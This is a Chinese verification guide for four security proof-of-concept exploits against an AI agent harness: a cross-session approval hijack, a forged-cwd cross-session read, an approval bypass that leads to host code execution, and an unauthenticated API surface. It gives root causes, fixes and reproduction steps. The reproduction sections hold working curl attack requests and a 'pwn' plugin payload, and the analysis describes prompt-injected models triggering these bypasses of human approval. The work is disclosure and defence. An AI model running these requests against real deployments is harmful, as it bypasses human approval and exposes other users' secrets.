# 亲手核验指南（VERIFY.md）

本文件用于**亲手复核** `dsh-security-pocs` 的四个 PoC。每个 PoC 都是确定性复现：
模型轮由仓库自带的 `llm-mock-server` 脚本化（无 API key、无模型随机性），其余全部是真实
服务端行为（`session.create` / `session.prompt` / `/api/respond` / Typert Remote / `events.mux`）。

> 目标版本：`deepseek-harness 0.1.0-rc.5 @ 47f943859b`（npm `0.1.0-rc.6` 同代码路径）。

---

## 0. 总览

| PoC | 脚本 | 漏洞 | 核心判定证据 |
|---|---|---|---|
| V1 | `poc-v1-cross-session-approval-hijack.sh` | 跨会话审批/提问劫持（CWE-862/CWE-306） | 攻击者 respond `accepted:true` + 受害会话的 `danger-full-access` 命令真实执行（探针文件落盘） |
| V2 | `poc-v2-forged-cwd-cross-session-read.sh` | 伪造 cwd 跨会话读（CWE-639，opt-in） | 攻击者会话 A 的工具结果里出现受害者 B 的秘密+伪造 API key |
| V3 | `poc-v3-typert-runhosthalf-bypass.sh` | `runHostHalf` 审批绕过 + 任意 host 代码执行（CWE-306/862，opt-in） | 插件定义后从未运行/从未审批 → `requestId:null` 直接激活 → `invoke` 返回 `pwned:true` |
| V3b | `poc-v3b-typert-unauthenticated-surface.sh` | /api 未认证 Remote 面（CWE-306，默认挂载） | 无任何凭据的 curl 拿到插件清单/动态注册表/目录列表 |

运行时长：V1 ≈ 1–2 分钟，V2 ≈ 1.5–2 分钟，V3 ≈ 1.5–2 分钟，V3b ≈ 1 分钟。
V1/V2/V3 需要 mock（8000）+ web（3080）两个端口；V3b 只需要 3080。
每个漏洞的修复方案见对应小节（3.7 / 4.7 / 5.7 / 6.7），修复优先级总表见第 9 节；
每个漏洞的详细解释与根因分析见对应小节（3.8 / 4.8 / 5.8 / 6.8）。

---

## 1. 环境准备

```sh
# 前置：deepseek-harness 源码 checkout + pnpm install（脚本要求与 poc 仓库互为兄弟目录，
# 或用 REPO 环境变量显式指定）
cd /Users/lihao/Documents/deepseek-harness
pnpm install

# 工具：node(^22.19 || >=24)、pnpm、rg、curl、lsof（本机已具备）
node -v      # v26.6.0 ✅
which rg curl lsof node

# 端口：3080、8000 必须空闲
lsof -nP -iTCP:3080 -iTCP:8000 -sTCP:LISTEN
```

PoC 仓库：`/Users/lihao/Documents/dsh-security-pocs`。每个脚本都会：
- 自动查找 `../deepseek-harness`（或 `REPO=/path`）；
- 启动/停止自己的 mock 与 web 进程（`trap cleanup EXIT`）；
- 把证据写入 `evidence/` 子目录。

---

## 2. 公共机制（理解后才能亲手判断）

### 2.1 脚本化模型轮（llm-mock-server）
`packages/test-support/llm-mock-server` 是一个 OpenAI 兼容 mock 服务。脚本用
`--sequence tool_call_success --tool-name bash --tool-arguments '...'` 让模型轮**确定性地**
发出指定的工具调用——模拟“被提示注入引导的模型会发出的调用”。所以：

- 没有任何真实 DeepSeek 请求（`DEEPSEEK_API_KEY=mock-key` 只指向 `127.0.0.1:8000`）；
- 但**服务端**对工具调用的处理（审批入队、审批响应、工具执行、session 日志落盘）是真实的。

### 2.2 events.mux 全局广播（V1/V2 的攻击者信道）
`capture-mux.mjs` 以 WebSocket 订阅 `/api/events.mux`，把每个 frame 写成一行 JSONL：
`{ts, seq, frame}`。漏洞前提是：**mux 不做会话隔离**，任何客户端都能收到全部会话的
approval/question/事件帧。

### 2.3 证据文件约定
- `evidence/` 下按运行时间戳分目录/文件（`05-<variant>-<ts>-mux.jsonl`、`07-forged-cwd-<ts>/`、
  `08-remote-surface-<ts>/`、`10-runhosthalf-<ts>/`）。
- 每次运行的新证据是时间戳最新的那个。

---

## 3. V1 — 跨会话审批/提问劫持

### 3.1 攻击链
1. 受害会话 B 的模型发出 `bash` 工具调用（`sandbox_permissions: danger-full-access`），
   进入人工审批队列（`approval/requested`）。
2. 攻击者进程（独立、无任何会话凭据）订阅 `events.mux`，收到 **B 的** `approval/requested` 帧
   （含 `sessionId / approvalId / rpcId`）。
3. 攻击者 `POST /api/respond` 回 `{outcome:"allowed-once"}`；服务端只按 wire 字段关联
   （`api-proxy.ts:3696-3720`），**不校验应答者与持有者绑定**。
4. B 的 `danger-full-access` bash 命令真实执行——探针文件写到工作区之外。

### 3.2 运行

```sh
cd /Users/lihao/Documents/deepseek-harness
# 审批劫持（默认 bash 变体）
bash ../dsh-security-pocs/poc-v1-cross-session-approval-hijack.sh
# 提问劫持变体
VARIANT=question bash ../dsh-security-pocs/poc-v1-cross-session-approval-hijack.sh
```

### 3.3 预期输出与判定

bash 变体关键行：

```
victim sessionId: session-<...>
attacker captured: {... "method":"approval/requested", "payload":{"type":"approval/requested","sessionId":"session-<victim>","approvalId":"...","toolName":"bash","reason":"escalate sandbox to danger-full-access: ..."}}
attacker /api/respond -> {"accepted":true,...}
VERIFIED: bash command executed under danger-full-access; probe: MOCKPROBE
```

判定条件（三选一，全部为真才算复现成功）：
1. `attacker captured` 帧的 `payload.sessionId` 是**受害会话**（不是攻击者自己）；
2. `respond` 返回 `"accepted":true`；
3. 探针文件存在且内容为 `MOCKPROBE`。

question 变体关键行：

```
attacker /api/respond -> {"accepted":true,...}
VERIFIED: attacker answered the victim ask_user_question; respond=...
```

### 3.4 证据文件怎么查

```sh
CAP=$(ls -t /Users/lihao/Documents/dsh-security-pocs/evidence/05-bash-*-mux.jsonl | head -1)
rg 'approval/requested' "$CAP" | tail -1        # 攻击者捕获的受害审批帧
rg 'tool/result' "$CAP" | tail -3               # 受害会话工具执行结果
cat "$HOME/Documents/dsh-mock-bash-"*.txt      # 探针文件（最近一次）
```

### 3.5 手动逐步复现（亲手做一遍）

四个终端：

```sh
# T1 mock（脚本化：受害模型的 bash 工具调用）
cd /Users/lihao/Documents/deepseek-harness
node --import tsx packages/test-support/llm-mock-server/src/bin.ts --host 127.0.0.1 --port 8000 \
  --api-key mock-key --sequence tool_call_success --tool-name bash \
  --tool-arguments '{"command":"echo MOCKPROBE > /tmp/manual-probe.txt","description":"probe","sandbox_permissions":"danger-full-access","justification":"manual"}'

# T2 web
cd /Users/lihao/Documents/deepseek-harness
DEEPSEEK_BASE_URL=http://127.0.0.1:8000/v1 DEEPSEEK_API_KEY=mock-key \
  node --import tsx/esm apps/cli/src/bin.ts web --port 3080

# T3 攻击者 mux 捕获
node /Users/lihao/Documents/dsh-security-pocs/capture-mux.mjs /tmp/manual-mux.jsonl

# T4 受害者会话
curl -s -X POST http://127.0.0.1:3080/api/session.create -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r1","method":"session.create","payload":{"cwd":"/Users/lihao/Documents/deepseek-harness"}}'
curl -s -X POST http://127.0.0.1:3080/api/session.prompt -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r2","method":"session.prompt","payload":{"sessionId":"<SID>","mode":"queue","content":[{"type":"text","text":"proceed"}]}}'
```

T3 里出现 `approval/requested`（约 1–3 秒），记录其中的 `rpcId`、`payload.sessionId`、`payload.approvalId`。
然后攻击者回复（这是唯一的攻击动作，不含任何会话凭证，只有从广播帧里抄来的字段）：

```sh
curl -s -X POST http://127.0.0.1:3080/api/respond -H 'content-type: application/json' \
  -d '{"type":"client-response","rpcId":"<RPC>","result":{"ok":true,"value":{"sessionId":"<SID>","approvalId":"<AID>","outcome":"allowed-once"}}}'
```

最后确认受害命令真的执行了：`cat /tmp/manual-probe.txt` → `MOCKPROBE`。

### 3.6 亲手确认的关键点
- 攻击者全程没有 `sessionId` 之外的任何东西（无 UI、无 token、无 Origin）；
- `respond` 载荷里只有从广播帧抄来的 `sessionId/approvalId`——证明授权只看 wire 字段；
- 探针文件在**工作区之外**（`$HOME/Documents/` 或 `/tmp`）——证明是 `danger-full-access` 真执行。

---


### 3.7 如何修复（含修复验证）

**根因**：`approval/requested` / `question/requested` 经 `events.mux` **全局广播**
（`api-proxy.ts:1276, 1394, 1486, 3432-3447`），`POST /api/respond` 只按 wire 字段关联
（`api-proxy.ts:3696-3720`），应答者与会话持有者之间没有任何绑定。

**最小修复（推荐先做）**
- `respond` 增加“应答者=持有会话的人类 UI”校验：给人类 UI 会话签发**一次性 respond token**，
  随 `approval/requested` 帧只投递给该会话；服务端校验 token 与会话绑定、且只能消费一次。
- 这样即使 mux 仍广播，非持有者拿到 `approvalId/rpcId` 也无法应答（没有 token）。

**彻底修复**
- `events.mux` 按会话隔离：消费者只能订阅自己会话的帧；`approvalId`/`rpcId` 不投递给非持有者。
- `ask_user_question` 的 `question/requested` 走同一套隔离与应答校验。

**修复后验证**
- 重跑 `poc-v1-cross-session-approval-hijack.sh`（两个变体）：
  预期在 `attacker /api/respond` 处失败——返回 `accepted:false` / 403 / “approval not found”，
  且探针文件不再出现。
- 人工回归：人类 UI 正常批准/拒绝仍可用（token 链路不破坏正常流程）。


### 3.8 详细解释与根因分析

**脚本逐段在做什么**（对应 `poc-v1-cross-session-approval-hijack.sh` 的 8 步）
1. 准备：`PROBE="$HOME/Documents/dsh-mock-<variant>-<ts>.txt"`——探针文件故意放在工作区之外，
   用来证明危险命令是在 `danger-full-access` 下**真实执行**的（不是服务端空跑）。
2. 启动 mock：`llm-mock-server --sequence tool_call_success --tool-name bash --tool-arguments '{"command":"echo MOCKPROBE > ...","sandbox_permissions":"danger-full-access",...}'`。
   模型轮确定性发出一个危险 bash 调用；**真实服务端**会把它放入人工审批队列并广播。
3. 启动 `dsh web`：`DEEPSEEK_BASE_URL` 指向 mock、`DEEPSEEK_API_KEY=mock-key`——全程无真实密钥，
   用 `POST /api/host.describe` 做就绪探测。
4. 攻击者信道：`capture-mux.mjs` 以 **WebSocket 订阅 `/api/events.mux`**，无需任何会话凭据，
   就能收到服务端广播的所有帧（这是漏洞的信道前提）。
5. 受害会话：`session.create(cwd=$REPO)` + `session.prompt("proceed")`——真实创建会话，
   mock 让模型发出危险 bash 调用 → `approval/requested` 入队并广播。
6. 攻击者从捕获文件里抄出 `sessionId / approvalId / rpcId`。
7. 攻击者唯一动作：`POST /api/respond` 带 `{outcome:"allowed-once"}`。
8. 验证：探针文件存在 → 受害会话的危险命令被攻击者“批准”并执行。

**根因分析（为什么存在）**
- `api-proxy.ts:1276, 1394, 1486` 把 approval/question 帧 push 给 `muxQueues` 里的**所有**消费者；
  `:3432-3447` 在订阅时还会把全部 `pendingApprovals` 补发一遍——审批数据对全进程公开。
- `respond`（`:3696-3720`）按 `rpcId` 直接从 `pendingApprovals` 取条目（`:3699`），只校验载荷里
  的 `approvalId/sessionId` 与条目一致，**不存在“应答者是谁”的概念**。
- 本质：审批系统的信任模型是“谁拿到 `approvalId` 谁就能答”，而 `approvalId` 通过无鉴权广播
  泄露给所有人——信任假设被打破，且与“模型自答”（#250）是两个不同根因层。

**前提与攻击面**：目标机器有 `dsh web` 在跑；攻击者能连 `127.0.0.1:3080`（任何本机进程；
若沙箱不隔离 loopback，被提示注入的模型也能从模型侧触发）。LAN 变体：`0.0.0.0` 绑定时
LAN 对端同样可收 mux + respond。

**影响**：让受害会话的 `danger-full-access` bash 执行任意命令（写文件/外联/删除），或代答
`ask_user_question`（操纵模型决策）。无需受害者交互、无需会话凭据。

**与已公开报告的关系（增量性）**：#250 是“模型自答自己会话的审批”（CWE-284）；本项是
“任意会话代答”，修掉 #250（要求应答来自人类 UI）并不天然修掉本项，因为 mux 广播与 respond
关联从不区分来源会话。Fz0x00 G-5 是被动窃听；本项把窃听升级为主动操纵。

**诚实局限**：需要本机进程权限；若部署把 loopback 也隔离（如独立 network namespace），
本项在本机面失效，但 LAN 面（`0.0.0.0`）仍成立。

## 4. V2 — 伪造 cwd 跨会话读（CWE-639）

### 4.1 攻击链
1. `session.create` 接受调用方自报的 `cwd`（`api-proxy.ts:2167-2183`），甚至 `mkdir -p` 自动建目录。
2. `tool-session-query` 的 `session_search` 工具按 **`header.cwd` 字符串相等**做跨会话授权
   （`packages/session-query/tool-session-query/src/workspace-access.ts:94-96`）。
3. 攻击者用**受害者的 cwd** 创建会话 A（不使用 B 的 sessionId），A 的模型调用
   `session_search(query=<B 的秘密>)`，即读到 B 的完整历史。

> 前置：`tool-session-query` 是部署 opt-in（默认 web profile 不挂载）。脚本用 overlay
> 挂载它并打开全文索引——即仓库文档描述的 content-search 启用方式
> （`packages/bundle/web-app/cordis.patch.yml`）。

### 4.2 运行

```sh
cd /Users/lihao/Documents/deepseek-harness
bash ../dsh-security-pocs/poc-v2-forged-cwd-cross-session-read.sh
```

### 4.3 预期输出与判定

```
marker: VICTIM_SECRET_<ts>   fake key: sk-victim-<ts>-deadbeef
victim sessionId: session-<B>
attacker sessionId: session-<A>
  -> 与受害者 cwd 相同: /Users/lihao/Documents/deepseek-harness
  -> 受害者会话 ID 未被使用; 仅靠 cwd 字符串授权
CROSS-SESSION READ CONFIRMED — attacker session A read victim session B:
  {... "sessionId":"session-<A>" ... "tool/result" ... "VICTIM_SECRET_<ts>" ...}
✔ fake API key sk-victim-<ts>-deadbeef leaked to attacker session A
```

判定：mux 捕获里出现**属于会话 A** 的 `tool/result` 帧，内容包含 `VICTIM_SECRET_<ts>`
以及伪造 API key。

### 4.4 证据文件怎么查

```sh
D=$(ls -td /Users/lihao/Documents/dsh-security-pocs/evidence/07-forged-cwd-* | head -1)
cat "$D/overlay.yml"                      # 复现时挂载的 opt-in overlay
rg -n 'VICTIM_SECRET_|sk-victim-' "$D"/*.jsonl 2>/dev/null | tail -5
# 或从 mux 捕获里看 A 的 tool/result 帧全文
CAP=$(ls -t /Users/lihao/Documents/dsh-security-pocs/evidence/07-forged-cwd-*-mux.jsonl | head -1)
rg -n 'VICTIM_SECRET_' "$CAP" | tail -2
```

### 4.5 手动逐步复现

```sh
# T1 mock：B 轮回纯文本(success)，A 轮发脚本化的 session_search
cd /Users/lihao/Documents/deepseek-harness
node --import tsx packages/test-support/llm-mock-server/src/bin.ts --host 127.0.0.1 --port 8000 \
  --api-key mock-key --sequence success,tool_call_success,tool_call_success \
  --tool-name session_search --tool-arguments '{"query":"VICTIM_SECRET_manual"}'
```

overlay 文件（与脚本生成的一致）存为 `/tmp/v2-overlay.yml`：

```yaml
- id: session-query-sqlite
  config:
    path: ':memory:'
    openAt: first-search
- id: session-title-llm
  disabled: true
- insert:
    - id: tool-session-query
      name: '@deepseek-ai/dsh-tool-session-query'
```

```sh
# T2 web（带 overlay）
DEEPSEEK_BASE_URL=http://127.0.0.1:8000/v1 DEEPSEEK_API_KEY=mock-key \
  node --import tsx/esm apps/cli/src/bin.ts web --patch /tmp/v2-overlay.yml --port 3080

# T3 捕获
node /Users/lihao/Documents/dsh-security-pocs/capture-mux.mjs /tmp/v2-mux.jsonl

# T4 受害者 B：写入秘密
curl -s -X POST http://127.0.0.1:3080/api/session.create -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r1","method":"session.create","payload":{"cwd":"/Users/lihao/Documents/deepseek-harness"}}'
curl -s -X POST http://127.0.0.1:3080/api/session.prompt -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r2","method":"session.prompt","payload":{"sessionId":"<B>","mode":"queue","content":[{"type":"text","text":"Deployment note: database password is hunter2 and the production API key is sk-victim-manual-deadbeef (VICTIM_SECRET_manual). Do not commit it."}]}}'
sleep 8

# T5 攻击者 A：同样的 cwd，不含 B 的任何身份
curl -s -X POST http://127.0.0.1:3080/api/session.create -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r3","method":"session.create","payload":{"cwd":"/Users/lihao/Documents/deepseek-harness"}}'
curl -s -X POST http://127.0.0.1:3080/api/session.prompt -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r4","method":"session.prompt","payload":{"sessionId":"<A>","mode":"queue","content":[{"type":"text","text":"search for VICTIM_SECRET_manual"}]}}'
```

`rg VICTIM_SECRET_manual /tmp/v2-mux.jsonl` 应看到 A 的工具结果里包含 B 的秘密全文。

### 4.6 亲手确认的关键点
- 创建 A 时**从未出现 B 的 sessionId**；唯一的“凭据”是 `cwd` 字符串；
- 即使给 `/api` 加认证也修不掉：`session.create` 必须允许用户选目录，攻击者仍可自报任意 cwd；
- 这是 opt-in 面：只有启用了 content-search（挂载 `tool-session-query`）的部署受影响。

---


### 4.7 如何修复（含修复验证）

**根因**：`session.create` 接受调用方自报 `cwd`（`api-proxy.ts:2180`）并 `mkdir -p` 自动建目录
（`:1665`）；`headerAuthorized` 以 **`cwd` 字符串相等** 授权跨会话读取
（`packages/session-query/tool-session-query/src/workspace-access.ts:94-96`）。

**修复**
- 跨会话读取的授权键改为 **“注册工作区 + 会话所有权”**，不再比较 `header.cwd` 字符串：
  `recordAuthorized` / `headerAuthorized` 改为校验调用者与目标记录同属一个已注册工作区实例
  （例如工作区注册表 ID），或同一用户身份下的会话。
- `session.create` 的 `cwd` 必须命中**已注册工作区**才能创建；同时删掉对任意路径的
  `mkdir(cwd, { recursive: true })` 副作用（`api-proxy.ts:1665`）。
- 跨会话读取默认要求**用户审批**（一次性 token，复用 V1 的机制），不做静默授权。

**修复后验证**
- 重跑 `poc-v2-forged-cwd-cross-session-read.sh`：预期 A 的 `session_search` 返回
  `unauthorizedTarget()` / 空结果，mux 证据里不再出现 `VICTIM_SECRET_<ts>`。
- 代码审查确认：`workspace-access.ts` 中不再存在“两个会话 `cwd` 相同即可互读”的分支。


### 4.8 详细解释与根因分析

**脚本逐段在做什么**（对应 `poc-v2-forged-cwd-cross-session-read.sh`）
1. 生成唯一标记 `VICTIM_SECRET_<ts>` 与伪造密钥 `sk-victim-<ts>-deadbeef`——用于在证据里
   精确证明“读到的就是受害会话的内容”。
2. 写 overlay：挂载 `tool-session-query`（模型侧 `session_search` 工具）+ `openAt: first-search`
   （全文索引），并禁用 `session-title-llm` 保证 mock 序列不被标题生成消费——这正是仓库文档
   描述的 content-search 启用方式（`packages/bundle/web-app/cordis.patch.yml`）。
3. mock：`--sequence success,tool_call_success,tool_call_success`——B 的回合返回普通文本
   （秘密写在 prompt 内容里），A 的回合脚本化发出 `session_search(query=<marker>)`。
4. 受害会话 B：`session.create(cwd=$REPO)`，prompt 里写入“数据库密码 + 伪造 API key + 标记”。
5. 攻击者会话 A：**同样的 `cwd=$REPO`**，全程没有使用 B 的 sessionId、没有 token、没有 UI。
6. 攻击者 mux 捕获，然后 A 的模型调用 `session_search`。
7. 验证：在捕获里找**属于 A** 的 `tool/result` 帧，内容包含标记与伪造密钥。

**根因分析（为什么存在）**
- `session.create` 接受调用方自报的 `cwd`（`api-proxy.ts:2180`）并 `mkdir -p` 自动建目录
  （`:1665`）——工作区路径是**调用方自报的身份**，服务端不校验、不需要目录预先存在。
- `headerAuthorized`（`workspace-access.ts:94-96`）把“两个会话 `cwd` 字符串相等”当作跨会话
  读取的授权边界——授权键是“日志头里自报的路径”，而不是任何经过认证的身份。
- 本质：这是**授权设计缺陷**，不是漏配认证。`session.create` 必须允许用户选目录，所以
  攻击者总能自报任意 `cwd`；只要 `session_query` 还信任这个自报路径，跨会话读就成立。

**前提与攻击面**：仅影响启用了 content-search 的部署（默认 web profile 不挂载
`tool-session-query`，已用 `--dump-default-config` 验证）。`cwd` 通常就是项目目录，容易猜测。

**影响**：攻击者会话读到同 `cwd` 所有会话的完整历史（提示词、工具结果、密钥等）。因为多个
会话通常共享同一项目目录，一次 `session_search` 可覆盖一片会话。

**与已公开报告的关系（增量性）**：P16/G-2 是“无鉴权 RPC 直读会话内容”，根因是 `/api` 缺认证；
本项即使给 `/api` 加上完整认证依然成立（`session.create` 仍接受任意 cwd，`session_query` 仍
按 cwd 相等授权）——是独立于认证缺失的第二条根因。

**诚实局限**：opt-in 面，默认部署不可达（Medium）；需要知道受害者的 cwd（通常是仓库路径）；
泄漏内容取决于全文索引覆盖范围。

## 5. V3 — `runHostHalf` 审批绕过 → 任意 host 代码执行

### 5.1 攻击链
1. 受害会话的模型用 `cordis_define` 定义一个插件（host handler `pwn`）——**定义后从未运行、
   从未审批**。
2. 攻击者（独立 curl，无会话/无 UI/无凭据）调 Remote `dynamicCordisRunner/runHostHalf`，
   `requestId:null`（设计上是“人类在 UI 点击运行”的分支）——服务端不做审批与持有者校验
   （`cordis-host-runner/src/index.ts:324-377`），直接激活插件。
3. 攻击者调 `dynamicCordisRunner/invoke` 执行插件的 host handler（`index.ts:740-762`），
   拿到 `pwned:true` + 时间戳 marker。

### 5.2 运行

```sh
cd /Users/lihao/Documents/deepseek-harness
bash ../dsh-security-pocs/poc-v3-typert-runhosthalf-bypass.sh
```

### 5.3 预期输出与判定

```
session: session-<S>
inventory: 插件已定义但从未运行(无 activeRun) ✅
runHostHalf 接受: 插件已激活(人工审批被绕过)   # {"ok":true,...,"pluginRunId":"run-1","startedHere":true}
pluginRunId=run-1
invoke -> {"ok":true,"value":{"pwned":true,"marker":"DSH-RH-<ts>","arg":{"hello":"from-attacker",...}}}
PWNED — 攻击者未经人工审批激活插件并执行其 host handler
```

判定（缺一不可）：
1. `02-inventory-before.json` 里**没有** `activeRun`（插件定义后未运行）；
2. `runHostHalf` 返回 `"ok":true`（`requestId:null` 分支被触发）；
3. `invoke` 返回 `"ok":true` 且包含 `marker`。

### 5.4 证据文件怎么查

```sh
D=$(ls -td /Users/lihao/Documents/dsh-security-pocs/evidence/10-runhosthalf-* | head -1)
cat "$D/overlay.yml"                       # tool-cordis opt-in overlay
cat "$D/02-inventory-before.json"          # 无 activeRun
cat "$D/03-runhosthalf.json"               # ok:true, requestId:null
cat "$D/04-inventory-active.json"          # activeRun.pluginRunId=run-1
cat "$D/05-invoke-result.json"             # pwned:true, marker
```

### 5.5 手动逐步复现

```sh
# T1 mock：脚本化 cordis_define
cd /Users/lihao/Documents/deepseek-harness
HOST_CODE='return { apply(ctx) { harness.handle("pwn", async (args) => ({ pwned: true, marker: "DSH-RH-manual", arg: args })) } }'
ARGS=$(node -e 'console.log(JSON.stringify({plugin:{kind:"new",idPrefix:"pwn"},name:"pwn",purpose:"demo",code:{host:process.argv[1]}}))' "$HOST_CODE")
node --import tsx packages/test-support/llm-mock-server/src/bin.ts --host 127.0.0.1 --port 8000 \
  --api-key mock-key --sequence tool_call_success --tool-name cordis_define --tool-arguments "$ARGS"
```

overlay `/tmp/v3-overlay.yml`：

```yaml
- id: session-title-llm
  disabled: true
- insert:
    - id: tool-cordis
      name: '@deepseek-ai/dsh-tool-cordis'
```

```sh
# T2 web
DEEPSEEK_BASE_URL=http://127.0.0.1:8000/v1 DEEPSEEK_API_KEY=mock-key \
  node --import tsx/esm apps/cli/src/bin.ts web --patch /tmp/v3-overlay.yml --port 3080

# T3 受害者定义插件
SID=$(curl -s -X POST http://127.0.0.1:3080/api/session.create -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r1","method":"session.create","payload":{"cwd":"/Users/lihao/Documents/deepseek-harness"}}')
# 提取 sessionId 后：
curl -s -X POST http://127.0.0.1:3080/api/session.prompt -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r2","method":"session.prompt","payload":{"sessionId":"<SID>","mode":"queue","content":[{"type":"text","text":"define the plugin"}]}}'
sleep 10

# T4 攻击者：确认已定义未运行
curl -s -X POST http://127.0.0.1:3080/api/dynamicCordisRunner/inventory -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r3","method":"dynamicCordisRunner/inventory","payload":{"args":{}}}'
# 从返回里抄 pluginId / agentId / packageId

# T5 攻击者：requestId:null 直接激活（无审批）
curl -s -X POST http://127.0.0.1:3080/api/dynamicCordisRunner/runHostHalf -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r4","method":"dynamicCordisRunner/runHostHalf","payload":{"args":{"agentId":"<AGENT>","pluginId":"<PLUGIN>","packageId":"<PKG>","mode":"run","requestId":null,"approveFutureVersions":true}}}'

# T6 攻击者：执行 host handler
curl -s -X POST http://127.0.0.1:3080/api/dynamicCordisRunner/invoke -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r5","method":"dynamicCordisRunner/invoke","payload":{"args":{"pluginId":"<PLUGIN>","pluginRunId":"run-1","method":"pwn","args":{"hello":"from-attacker"}}}}'
# 期望 {"ok":true,"value":{"pwned":true,"marker":"DSH-RH-manual",...}}
```

### 5.6 亲手确认的关键点
- 整个链路上**没有任何人类审批 UI**：`requestId:null` 就是“面板直动手势”；
- `owned()` 只比较 `plugin.sessionId === agent.id`，而 `agent` 由**调用方传的 sessionId 字符串**
  解析——攻击者传插件所属会话的 id 即可通过；
- `invoke` 只校验 runId，直接执行 host handler（host half 本身不是沙箱）。

---


### 5.7 如何修复（含修复验证）

**根因**：`runHostHalf` 的 `requestId:null` 分支不做任何审批/持有者校验
（`cordis-host-runner/src/index.ts:324-377`）；`owned()` 只比较 `plugin?.sessionId === agent.id`
（`index.ts:389-392`），而 `agent` 由**调用方传入的 `sessionId` 字符串**解析
（`packages/api/remotes/src/agent-lookup.ts`）；`invoke`（`index.ts:741-762`）只校验 runId 就
执行 handler。

**修复**
- `requestId:null` 分支必须要求**人类 UI 的一次性 token**（与 V1 同一机制），不允许 Remote 调用
  凭空触发。
- Remote 方法（`runHostHalf` / `invoke` / `inventory` / `resolveRequestRun`）统一绑定
  “调用者持有该会话”：`agent` 必须从**服务端会话注册表按调用者身份**解析，而不是信任请求体里的
  `sessionId` 字符串。
- `invoke` 增加校验：`plugin.sessionId === 调用者会话.id`，且 runId 属于该插件当前运行实例。
- 停止在全局 mux 广播 `cordis/request-run`（`requestId`/`agentId` 只投递给持有会话）。

**修复后验证**
- 重跑 `poc-v3-typert-runhosthalf-bypass.sh`：预期 `runHostHalf` 被拒绝（缺 token / 无持有者
  身份），`invoke` 返回无权限或“plugin not running”。
- 人工回归：人类在 UI 点击运行插件仍可用（token 链路）。


### 5.8 详细解释与根因分析

**脚本逐段在做什么**（对应 `poc-v3-typert-runhosthalf-bypass.sh`）
1. overlay：挂载文档化的 `tool-cordis`（自引用插件工具集，默认不随构建分发）。
2. mock：脚本化发出 `cordis_define`，定义插件 `pwn-1`，host handler 为
   `harness.handle('pwn', ...)` 返回 `{pwned:true, marker, arg}`。
3. 受害会话：`session.prompt("define the plugin")` → 插件被**定义但从未运行、从未审批**。
4. 攻击者 `dynamicCordisRunner/inventory`：确认插件存在且**无 `activeRun`**（未运行状态）。
5. 攻击者 `runHostHalf {agentId, pluginId, packageId, mode:"run", requestId:null,
   approveFutureVersions:true}`——`requestId:null` 是设计上“人类在 UI 点击运行”的分支，
   服务端直接激活（`{"ok":true,"pluginRunId":"run-1","startedHere":true}`）。
6. 攻击者轮询 inventory 拿 `activeRun.pluginRunId`。
7. 攻击者 `invoke {pluginId, pluginRunId:"run-1", method:"pwn", args}` → 执行 host handler，
   返回 `{"pwned":true,"marker":"DSH-RH-<ts>"}`。

**根因分析（为什么存在）**
- `runHostHalf`（`cordis-host-runner/src/index.ts:324-377`）的 `requestId:null` 分支不做任何
  审批与持有者校验；`owned()`（`:389-392`）只比较 `plugin?.sessionId === agent.id`，而 `agent`
  由**调用方传入的 `sessionId` 字符串**解析（`packages/api/remotes/src/agent-lookup.ts`）——
  攻击者只需传插件所属会话的 id 即可通过。
- `invoke`（`:741-762`）只校验 runId 匹配就调用 `run.handlers.get(method)`——运行中的任意插件
  的 host handler 都可被直接执行。
- host half 本身不是沙箱（`cordis-host-runner/src/sandbox.ts:1-10`）：`ctx.bash/fs/web`、
  `harness.defineTool/registerTool` 直达真实运行时。
- 本质：`requestId:null` 的信任假设是“只有人类 UI 会这么调”，但 Remote 面（V3b）无鉴权可达，
  假设不成立。

**前提与攻击面**：需要挂载 `tool-cordis`（文档化 opt-in）；`/api` 在 trusted-host 语义下可达
（本机默认，LAN 需 `0.0.0.0`）。攻击者需要知道插件所属的 `sessionId`（`inventory` 返回）。

**影响**：把“模型定义了插件但未运行”升级为“攻击者无审批激活并执行 host handler”，获得完整
宿主运行时权限——这是 V3b 暴露面上可用的**执行原语**，也是 V1 之外的第二个“绕过人类审批”通道。

**与已公开报告的关系（增量性）**：P16/G-2 覆盖无鉴权**读**；本项是无鉴权 **Remote 服务面**的
“激活 + 执行”链。G-4（LAN/trustedHosts）原先只是文档级 P2；本项给出可复现的默认面 + opt-in
RCE 链，把它升级为 P1。

**诚实局限**：需要 `tool-cordis` opt-in；攻击者要先有一个“定义了插件”的会话（提示注入可诱导）；
LAN 变体需要运维显式绑 `0.0.0.0`。

## 6. V3b — /api 未认证 Remote 面（默认挂载）

### 6.1 攻击链
默认 web profile 就挂载 `typert-gateway` + `api-remotes` + `cordis-host-runner` +
`plugin-inventory`。Typert Gateway 以 `authority: 'trusted-host'` 拦截 `/api`
（`packages/api/gateway/src/index.ts:110-118`），而 `isTrustedApiRequest` 只要求
`Host` 是本机/`trustedHosts`，**不要求 Origin**（`packages/client/connection/src/api-request-trust.ts:96-118`）。
因此任何本机进程（默认部署）或 LAN 对端（`0.0.0.0` + `resolveLanTrust`）都能无鉴权调用。

### 6.2 运行

```sh
cd /Users/lihao/Documents/deepseek-harness
bash ../dsh-security-pocs/poc-v3b-typert-unauthenticated-surface.sh
```

### 6.3 预期输出与判定

```
RPC1 pluginInventory/list -> ✔ entries=133      # Loader 插件清单
RPC2 dynamicCordisRunner/inventory -> ✔ result.ok=true   # 动态注册表
RPC3 host.listDirectory(/) -> native 不可用（记录默认形态）
BROWSE overlay 后 host.listDirectory(/Users/lihao) -> ✔ ok:true, entries=48
```

判定：三个 RPC 都是**裸 curl**（无 Authorization、无 cookie、无 Origin），拿到
插件清单/注册表/目录列表。

### 6.4 证据文件怎么查

```sh
D=$(ls -td /Users/lihao/Documents/dsh-security-pocs/evidence/08-remote-surface-* | head -1)
cat "$D/01-pluginInventory-list.json"         # entries 数组
cat "$D/02-dynamicCordisRunner-inventory.json"
cat "$D/04-host-listDirectory-browse.json"    # /Users/lihao 目录列表
```

### 6.5 手动逐步复现

```sh
